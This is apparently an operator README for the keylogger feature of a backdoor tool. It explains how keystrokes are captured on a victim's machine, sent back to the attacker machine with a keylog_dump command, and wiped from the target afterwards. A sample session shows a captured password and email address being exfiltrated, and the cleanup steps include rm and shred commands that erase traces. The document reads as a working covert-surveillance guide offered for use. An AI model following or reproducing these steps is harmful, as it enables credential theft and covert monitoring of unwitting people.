# Keylog Directory

This directory stores keystroke logs captured from the target machine.

## File Information

### Main Log File

- **Filename:** `keylog.txt`
- **Location:** `logs/keylog/keylog.txt`
- **Format:** Plain text with timestamps

### Log Format

```
[YYYY-MM-DD HH:MM:SS] captured keystrokes...
[2025-10-04 14:25:12] Hello World
[2025-10-04 14:26:45] password123
[2025-10-04 14:27:10] username@email.com
```

## How It Works

### Keystroke Capture

1. **Regular Keys** - Letters, numbers, symbols logged as-is
2. **Space** - Logged as space character
3. **Enter** - Creates new line and triggers auto-save
4. **Tab** - Logged as tab character
5. **Backspace** - Removes last character from buffer
6. **Special Keys** - Logged in brackets: `[SHIFT]`, `[CTRL]`, `[ALT]`

### Auto-Save Mechanism

- Saves automatically every 50 keystrokes
- Saves when Enter key is pressed
- Saves when keylogger is stopped
- Each entry includes timestamp

## Commands

### Start Keylogger

```bash
keylog_start
```

Begins capturing keystrokes and logging to `keylog.txt`

### Download Keylog File

```bash
keylog_dump
```

**What happens:**

1. Saves any buffered keystrokes
2. Automatically downloads file to attacker machine
3. Saves as: `keylog_dump_YYYYMMDD_HHMMSS.txt`
4. Displays content in terminal

**Note:** File is downloaded to attacker machine, not just displayed!

### Check Status

```bash
keylog_status
```

Shows:

- Running status (active/stopped)
- Log file path
- Buffer size
- File size

### Stop Keylogger

```bash
keylog_stop
```

Stops capturing and saves any remaining logs

### Clear Logs

```bash
keylog_clear
```

Deletes the `keylog.txt` file and clears buffer

## File Management

### On Target Machine

- **Location:** `logs/keylog/keylog.txt`
- **Purpose:** Temporary storage of captured keystrokes
- **Persistence:** Grows until cleared or downloaded

### On Attacker Machine

After running `keylog_dump`, files are saved as:

```
keylog_dump_20251004_143022.txt
keylog_dump_20251004_150530.txt
keylog_dump_20251005_091245.txt
```

- **Location:** Same directory where `server.py` runs
- **Format:** Identical to target's log file
- **Benefit:** Each dump creates new file (no overwrites)

## Cleanup

### Clear Target Logs

```bash
# From backdoor interface
keylog_clear
```

### Manual Cleanup (if needed)

```bash
# On target machine
rm logs/keylog/keylog.txt

# On attacker machine (after analysis)
shred -u keylog_dump_*.txt
```

## Troubleshooting

### Issue: "Keylogger feature not available"

**Solution:** Install pynput library

```bash
pip install pynput
```

### Issue: Empty log file

**Possible causes:**

1. Keylogger not started - Run `keylog_start`
2. No keyboard activity on target
3. Permissions issue - Check file permissions

### Issue: Log file not found

**Solution:**

1. Start keylogger: `keylog_start`
2. Wait for keyboard activity
3. Check status: `keylog_status`

## Usage Example

Complete workflow:

```bash
# 1. Start keylogger
[192.168.0.107]> keylog_start
Keylogger started successfully

# 2. Wait for target to type (monitoring happens automatically)
# ...

# 3. Download captured keystrokes
[192.168.0.107]> keylog_dump

Keylog file ready: logs/keylog/keylog.txt
[*] Downloading keylog file...
[+] Keylog file downloaded: keylog_dump_20251004_143022.txt

=== Keylog Content ===
[2025-10-04 14:25:12] password123
[2025-10-04 14:26:45] username@email.com
=== End of Keylog ===

# 4. (Optional) Clear logs on target
[192.168.0.107]> keylog_clear
Logs cleared successfully

# 5. Stop keylogger when done
[192.168.0.107]> keylog_stop
Keylogger stopped successfully
```

## File Size Considerations

Typical file sizes:

- **1 hour of typing:** ~50-200 KB
- **1 day of normal use:** ~500 KB - 2 MB
- **1 week:** ~2-10 MB

**Note:** File size varies greatly depending on typing activity.
